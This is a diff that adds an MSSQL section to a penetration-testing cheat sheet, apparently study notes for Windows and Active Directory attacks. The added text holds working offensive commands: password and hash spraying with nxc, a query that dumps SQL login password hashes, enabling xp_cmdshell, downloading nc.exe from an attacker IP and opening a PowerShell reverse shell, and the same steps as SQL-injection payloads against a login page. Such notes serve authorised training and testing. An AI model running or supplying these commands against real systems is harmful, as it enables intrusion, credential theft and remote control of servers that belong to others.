@@ -613,6 +613,84 @@ samdump2 SYSTEM SAM
 
 # Note: Pay attention to case sensitive, upper and lower case. Try both tools always, one might fail
 ```
+### MSSQL Basics
+```shell
+# Enumerating MSSQL
+nxc mssql ips_internal.txt -u john -p 'Password123!' --continue-on-success
+nxc mssql ips_internal.txt -u john -H 1a06b4248879e68a498d3bac51bf91c9 --continue-on-success
+
+# Credentialed Login
+impacket-mssqlclient john:'Password123!'@172.16.150.10 -windows-auth
+
+# MSSQL queries
+# Show current username
+SELECT USER_NAME(); 
+SELECT CURRENT_USER; 
+
+# Show server version
+SELECT @@VERSION;
+
+# Get server name 
+SELECT @@SERVERNAME; 
+
+# Show list of databases ("master." is optional) 
+SELECT name FROM master.sys.databases; 
+EXEC sp_databases; 
+
+# Show only user-created databases (exclude built-in databases)
+SELECT name FROM master.sys.databases WHERE name NOT IN ('master', 'tempdb', 'model', 'msdb'); 
+
+# Use a specific database
+USE master; 
+
+# Get table names from a specific database
+SELECT table_name FROM somedatabase.information_schema.tables; 
+
+# Get column names from a specific table
+SELECT column_name FROM somedatabase.information_schema.columns WHERE table_name = 'sometable'; 
+
+# Get credentials for 'sa' login user
+SELECT name, master.sys.fn_varbintohexstr(password_hash) FROM master.sys.sql_logins; 
+
+# Get credentials from 'vorkharium' database using 'dbo' table schema
+SELECT * from vorkharium.dbo.users; 
+```
+### MSSQL Reverse Shell
+```shell
+# Getting Reverse Shell using nc.exe
+# Start python3 http.server at port 8080 in Kali hosting nc.exe
+python3 -m http.server 8080
+# Start nc listener at port 443 in Kali
+sudo nc -lvnp 443
+# Getting Reverse Shell using MSSQL
+EXECUTE sp_configure 'show advanced options', 1; RECONFIGURE;
+EXECUTE sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+EXECUTE xp_cmdshell "curl http://192.168.45.200:8080/nc.exe -o C:\\Users\\Public\\nc.exe";
+EXECUTE xp_cmdshell "C:\\Users\\Public\\nc.exe -nv 192.168.45.200 443 -e powershell.exe";
+
+# Getting Reverse Shell using NetExec and CrackMapExec
+# Start nc listener at port 443 in Kali
+sudo nc -lvnp 443
+# Getting a reverse shell
+nxc mssql 172.16.150.10 -d vorkharium.com -u john -p Password123 -x "Enter revshells.com PowerShell#3 (Base64) Reverse Shell here"
+crackmapexec mssql 172.16.150.10 -d vorkharium.com -u john -p Password123 -x "Enter revshells.com PowerShell#3 (Base64) Reverse Shell here"
+
+# Using MSSQL Injection through vulnerable website
+# Go to /login.aspx
+http://vulnerablewebsite.com/login.aspx
+
+# Start python3 server where nc.exe is hosted
+python3 -m http.server 8080
+
+# Start nc listener
+nc -lvnp 443
+
+# Exploit MSSQL Injection to get a shell in our nc listener port 4444
+' EXECUTE sp_configure 'show advanced options', 1; RECONFIGURE; -- //
+' EXECUTE sp_configure 'xp_cmdshell', 1; RECONFIGURE; -- //
+' EXECUTE xp_cmdshell "curl http://192.168.45.200:8080/nc.exe -o C:\\Users\\Public\\nc.exe"; -- //
+' EXECUTE xp_cmdshell "C:\\Users\\Public\\nc.exe -nv 192.168.45.200 443 -e powershell.exe"; -- //
+```
 ### Silver Ticket
 ```shell
 Comming soon.
@@ -650,8 +728,3 @@ Set-DomainObject -Identity targetusername -XOR @{UserAccountControl=4194304}
 # 4194304 sets the PASSWD_NOTREQD flag, allowing the account to operate without a required password
 ```
 More ACLs Abuse Attacks on https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse
-
-### MSSQL to gain Shell Access
-```shell
-Comming soon.
-```
